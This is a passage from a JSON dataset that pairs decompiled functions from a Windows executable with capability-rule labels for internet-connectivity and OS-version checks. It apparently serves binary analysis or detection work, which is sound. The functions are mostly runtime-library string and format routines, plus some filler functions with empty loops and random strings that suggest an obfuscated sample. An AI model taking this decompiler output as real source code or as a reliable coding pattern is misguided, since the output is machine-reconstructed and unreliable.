        "decompiled_code": "\nuint32_t __cdecl fcn.00403fd0(uchar (*arg_8h) [32], uint32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uchar (*pauVar2) [32];\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar auVar5 [16];\n    uchar auVar6 [32];\n    uchar in_YMM1 [32];\n    uint8_t uVar7;\n    \n    if (*0x573c4c < 5) {\n        if (*0x573c4c < 1) {\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + arg_ch) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + arg_ch);\n            }\n            uVar3 = pauVar2 - arg_8h;\n        }\n        else {\n            uVar4 = -((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf);\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + uVar4) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + uVar4);\n            }\n            uVar3 = pauVar2 - arg_8h;\n            if (uVar3 == uVar4) {\n                puVar1 = *pauVar2;\n                while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xfffffff0) &&\n                       (uVar7 = -((*pauVar2)[0xf] == '\\0'), \n                       auVar5 = CONCAT115(uVar7, CONCAT114(-((*pauVar2)[0xe] == '\\0'), \n                                                           CONCAT113(-((*pauVar2)[0xd] == '\\0'), \n                                                                     CONCAT112(-((*pauVar2)[0xc] == '\\0'), \n                                                                               CONCAT111(-((*pauVar2)[0xb] == '\\0'), \n                                                                                         CONCAT110(-((*pauVar2)[10] ==\n                                                                                                    '\\0'), CONCAT19(-((*\n                                                            pauVar2)[9] == '\\0'), \n                                                            CONCAT18(-((*pauVar2)[8] == '\\0'), \n                                                                     CONCAT17(-((*pauVar2)[7] == '\\0'), \n                                                                              CONCAT16(-((*pauVar2)[6] == '\\0'), \n                                                                                       CONCAT15(-((*pauVar2)[5] == '\\0')\n                                                                                                , CONCAT14(-((*pauVar2)\n                                                                                                             [4] == '\\0'\n                                                                                                            ), CONCAT13(\n                                                            -((*pauVar2)[3] == '\\0'), \n                                                            CONCAT12(-((*pauVar2)[2] == '\\0'), \n                                                                     CONCAT11(-((*pauVar2)[1] == '\\0'), \n                                                                              -((*pauVar2)[0] == '\\0')))))))))))))))), \n                       (SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | (uVar7 >> 7) << 0xf) == 0))) {\n                    pauVar2 = *pauVar2 + 0x10;\n                }\n                for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n                }\n                uVar3 = pauVar2 - arg_8h;\n            }\n        }\n    }\n    else {\n        uVar4 = -((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f);\n        if (arg_ch < uVar4) {\n            uVar4 = arg_ch;\n        }\n        pauVar2 = arg_8h;\n        if (arg_8h != *arg_8h + uVar4) {\n            do {\n                if ((*pauVar2)[0] == '\\0') break;\n                pauVar2 = *pauVar2 + 1;\n            } while (pauVar2 != *arg_8h + uVar4);\n        }\n        uVar3 = pauVar2 - arg_8h;\n        if (uVar3 == uVar4) {\n            puVar1 = *pauVar2;\n            auVar5 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xffffffe0) &&\n                   (auVar6 = vpcmpeqb_avx2(ZEXT1632(auVar5), *pauVar2), \n                   (SUB321(auVar6 >> 7, 0) & 1 | (SUB321(auVar6 >> 0xf, 0) & 1) << 1 |\n                    (SUB321(auVar6 >> 0x17, 0) & 1) << 2 | (SUB321(auVar6 >> 0x1f, 0) & 1) << 3 |\n                    (SUB321(auVar6 >> 0x27, 0) & 1) << 4 | (SUB321(auVar6 >> 0x2f, 0) & 1) << 5 |\n                    (SUB321(auVar6 >> 0x37, 0) & 1) << 6 | (SUB321(auVar6 >> 0x3f, 0) & 1) << 7 |\n                    (SUB321(auVar6 >> 0x47, 0) & 1) << 8 | (SUB321(auVar6 >> 0x4f, 0) & 1) << 9 |\n                    (SUB321(auVar6 >> 0x57, 0) & 1) << 10 | (SUB321(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB321(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB321(auVar6 >> 0x77, 0) & 1) << 0xe | SUB321(auVar6 >> 0x7f, 0) << 0xf |\n                    (SUB321(auVar6 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar6 >> 0x8f, 0) & 1) << 0x11 |\n                    (SUB321(auVar6 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar6 >> 0x9f, 0) & 1) << 0x13 |\n                    (SUB321(auVar6 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar6 >> 0xaf, 0) & 1) << 0x15 |\n                    (SUB321(auVar6 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar6 >> 0xbf, 0) << 0x17 |\n                    (SUB321(auVar6 >> 199, 0) & 1) << 0x18 | (SUB321(auVar6 >> 0xcf, 0) & 1) << 0x19 |\n                    (SUB321(auVar6 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar6 >> 0xdf, 0) & 1) << 0x1b |\n                    (SUB321(auVar6 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar6 >> 0xef, 0) & 1) << 0x1d |\n                    (SUB321(auVar6 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar6 >> 0xff, 0) << 0x1f) == 0))) {\n                pauVar2 = pauVar2[1];\n            }\n            for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n            }\n            uVar3 = pauVar2 - arg_8h;\n            vzeroupper_avx();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 2380
    },
    "00403fdf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403fdf(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00403e8b(&var_8h);\n    fcn.00403d55(0x2e);\n    arg_8h_00 = fcn.0040295a(&var_10h, 0, 0);\n    fcn.00402eeb(arg_8h_00);\n    if (**0x574458 == '@') {\n        *0x574458 = *0x574458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 256
    },
    "00403fe4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403fe4(uint *arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != NULL) {\n        (***arg_8h)(1);\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00403fee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403fee(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00403ffd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403ffd(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack60;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4510a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    for (iStack60 = 0x27; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 216
    },
    "00404011": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404011(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.004019e7();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.004019e7();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 141
    },
    "0040405c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040405c(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t *var_4h;\n    \n    if (*0x57504c == 0) {\n        if (arg_8h + 1U < 0x101) {\n            return *(*0x571e78 + arg_8h * 2) & 2;\n        }\n    }\n    else {\n        arg_8h_00 = fcn.004043ef();\n        var_4h = *(arg_8h_00 + 0x4c);\n        fcn.0040449e(arg_8h_00, &var_4h);\n        if (arg_8h + 1U < 0x101) {\n            return *(*var_4h + arg_8h * 2) & 2;\n        }\n        if (1 < var_4h[1]) {\n            uVar1 = fcn.0040433b(arg_8h, 2, 0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "00404115": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404115(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049fb1c;\n            param_1[7] = 8;\ncode_r0x0049f9e7:\n            puStack8 = 0x49f9ec;\n            puVar6 = fcn.00403a35();\n            *puVar6 = 0x16;\n            puStack8 = 0x49f9f7;\n            uVar7 = fcn.004037ce();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049f9e7;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049fb1c;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049fb1c;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049fb1c;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049fb1c;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049fb1c;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049fb1c;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049fb1c:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049fb1c;\n    param_1[7] = 7;\n    puStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a1723:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a1727:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a172a:\n            cVar5 = fcn.00403f71(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a16cf:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a172a;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a16e3;\n                if (uVar9 < 0x45) goto code_r0x004a18c2;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a18c2;\n                    goto code_r0x004a16b7;\n                }\n            }\ncode_r0x004a1733:\n            cVar5 = fcn.004064d3();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00403fc6();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a1733;\n            if (uVar9 != 99) goto code_r0x004a18c2;\ncode_r0x004a16e3:\n            cVar5 = fcn.00404345(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00405920();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a1733;\n            if (uVar9 == 0x69) goto code_r0x004a1723;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00401c35();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a18c2;\n                cVar5 = fcn.004057bd();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a18c2;\n                arg_ch_00 = 0;\n                goto code_r0x004a16cf;\n            }\n            goto code_r0x004a1727;\n        }\ncode_r0x004a16b7:\n        cVar5 = fcn.00402f18();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.004035d0(),  cVar5 != '\\0')) || (*(param_1 + 0xc) != '\\0'))\n    goto code_r0x004a18c2;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a17cd;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a17cd:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.004040ed(&stack0xfffffff0, arg_ch, param_1 + 6, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405bd2(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.0040435e(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a18c2:\n    uVar7 = fcn.004030bc(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2673
    },
    "0040418d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.0040418d(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f948, 0x10);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        uVar2 = 0xffffffffffffffff;\n    }\n    else {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.004013f7(*(unaff_EBP + 8));\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.004d22ac(*(unaff_EBP + 8));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -0x1c) = uVar2 >> 0x20;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004d224d(0x56f948);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 356
    },
    "004041a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004041a6(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.00405ef2(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, in_stack_ffffffdc);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f78(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.00405ef2(&var_ch, var_10h, param_1 + 0x18, param_1 + 0xc);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.004030bc(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 413
    },
    "004041bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004041bf(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4182b0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"alhxmeenpgzduymobqodxtojnkwjmkequuyfv\");\n    for (iStack116 = 0x14; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0x2b; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    for (iStack124 = 0x24; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"dyhaqfhawhs\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 365
    },
    "004041d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004041d8(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450560;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    for (var_28h = 0x3c; 0 < var_28h; var_28h = var_28h + -1) {\n    }\n    for (var_2ch = 0x2a; 0 < var_2ch; var_2ch = var_2ch + -1) {\n    }\n    for (var_30h = 7; 0 < var_30h; var_30h = var_30h + -1) {\n    }\n    var_10h = 0;\n    fcn.00401e79(\"wlwnwhspzig\");\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 333
    },
    "004041e7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004041e7(int32_t arg_8h)\n\n{\n    int32_t iStack40;\n    \n    iStack40 = 1;\n    while (0 < iStack40) {\n        arg_8h = iStack40 + -1;\n        iStack40 = arg_8h;\n    }\n    return arg_8h;\n}\n",
        "token_count": 82
    },
    "004041f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004041f6(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint32_t arg_24h, uint noname_8, uint arg_2ch, uint arg_30h)\n\n{\n    uint *puVar1;\n    int32_t arg_8h_00;\n    uint32_t in_ECX;\n    uint arg_2ch_00;\n    uint uVar2;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((((arg_ch == 0) || (arg_10h == 0)) || (arg_14h == 0)) || (arg_18h == 0)) {\n        puVar1 = fcn.00403a35();\n        uVar2 = 0x16;\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        var_4h = in_ECX;\n        if (((arg_1ch == 0x41) || (arg_1ch == 0x45)) ||\n           ((arg_1ch == 0x46 || (var_4h = in_ECX & 0xffffff00,  arg_1ch == 0x47)))) {\n            var_4h = CONCAT31(var_4h._1_3_, 1);\n        }\n        if (((arg_24h & 8) == 0) && (arg_8h_00 = fcn.00404507(arg_8h),  arg_8h_00 != 0)) {\n            var_8h._1_3_ = in_ECX >> 8;\n            if ((*(arg_8h + 4) < 1) && (*(arg_8h + 4) < 0)) {\n                var_8h = CONCAT31(var_8h._1_3_, 1);\n            }\n            else {\n                var_8h = var_8h._1_3_ << 8;\n            }\n            uVar2 = fcn.004c5671(arg_8h_00, var_8h, arg_ch, arg_10h, var_4h);\n        }\n        else {\n            if ((arg_24h & 0x10) == 0) {\n                uVar2 = 2;\n            }\n            else {\n                uVar2 = 3;\n            }\n            arg_2ch_00 = 0;\n            if ((arg_24h & 0x20) != 0) {\n                arg_2ch_00 = arg_30h;\n            }\n            if (arg_1ch < 0x62) {\n                if 